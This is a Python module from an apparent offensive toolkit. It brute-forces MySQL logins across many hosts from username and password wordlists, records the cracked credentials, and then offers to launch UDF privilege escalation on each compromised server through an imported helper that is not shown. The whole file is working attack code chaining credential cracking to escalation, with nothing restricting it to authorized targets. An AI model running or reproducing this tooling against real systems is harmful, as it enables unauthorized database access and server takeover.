#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : mysql_burte.py
@Author : moresuo
@Time : 2026/6/26 15:29
@脚本说明 : mysql弱密码爆破 + UDF 提权联动
"""
import threading

import pymysql

from tools.AliveTools import filter_alive_hosts
from tools.ProgressTools import BurteProgress
from tools.SchedulerTools import run_batch
from tools.WordlistTools import load_lines
from tools.color import console

mysql_found_hosts = set()
mysql_found_lock = threading.Lock()
# 记录发现的凭证 {(ip, port): password}
mysql_found_creds = {}
mysql_creds_lock = threading.Lock()


# 连接MySQL
def scan_mysql(ip="127.0.0.1", port=3306, user="root", password="", connect_timeout=5):
    key = (ip, port)
    with mysql_found_lock:
        if key in mysql_found_hosts:
            return
    try:
        conn = pymysql.connect(
            host=ip,
            port=port,
            user=user,
            password=password,
            connect_timeout=connect_timeout,
            charset="utf8",
            autocommit=True
        )
        if conn:
            cursor = conn.cursor()
            ver = cursor.connection.get_server_info()
            console.print(f"    [success]✔ MySQL {ip}:{port} → {user}/{password}[/success] [dim]({ver})[/dim]")
            with mysql_found_lock:
                mysql_found_hosts.add(key)
            with mysql_creds_lock:
                mysql_found_creds[key] = password
            cursor.close()
        conn.close()
    except:
        pass


def _prompt_udf(host, port, pwd):
    """询问用户是否对该主机执行 UDF 提权。"""
    console.print(f"\n  [warn]发现 [highlight]{host}:{port}[/highlight] MySQL弱口令 [highlight]root/{pwd}[/highlight][/warn]")
    try:
        ans = input("  [warn]是否尝试 UDF 提权？[y/N]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return
    if ans in ("y", "yes"):
        console.print(f"  [info]→ 启动 UDF 提权...[/info]")
        from tools.mysql_udf import udf_escalate
        udf_escalate(host, port, pwd)


# 线程池执行任务
def scan_mysql_run_file(hosts, userpath, pwdpath, port, threads):
    mysql_found_hosts.clear()
    mysql_found_creds.clear()
    hosts_list = filter_alive_hosts(hosts, port, threads, service_name="MySQL")
    if not hosts_list:
        console.print("  [warn]未发现 MySQL 存活目标，跳过弱口令检测[/warn]")
        return
    users = load_lines(userpath)
    passwords = load_lines(pwdpath)
    tasks_count = len(hosts_list) * len(users) * len(passwords)
    tasks = ((ip, port, user, pwd) for ip in hosts_list for user in users for pwd in passwords)
    with BurteProgress(tasks_count, "MySQL弱口令") as progress:
        run_batch(tasks, scan_mysql, threads, on_progress=progress.update)
    # 扫描完成后询问 UDF
    _try_udf_after_scan()


# 指定用户名
def scan_mysql_run(hosts, username, password, port, threads):
    mysql_found_hosts.clear()
    mysql_found_creds.clear()
    hosts_list = filter_alive_hosts(hosts, port, threads, service_name="MySQL")
    if not hosts_list:
        console.print("  [warn]未发现 MySQL 存活目标，跳过弱口令检测[/warn]")
        return
    passwords = load_lines(password)
    tasks_count = len(hosts_list) * len(passwords)
    tasks = ((ip, port, username, pwd) for ip in hosts_list for pwd in passwords)
    with BurteProgress(tasks_count, "MySQL弱口令") as progress:
        run_batch(tasks, scan_mysql, threads, on_progress=progress.update)
    # 扫描完成后询问 UDF
    _try_udf_after_scan()


def _try_udf_after_scan():
    """扫描完毕后，遍历发现的主机，询问是否需要 UDF 提权。"""
    with mysql_creds_lock:
        creds = dict(mysql_found_creds)
    if not creds:
        return
    for (host, port), pwd in creds.items():
        _prompt_udf(host, port, pwd)
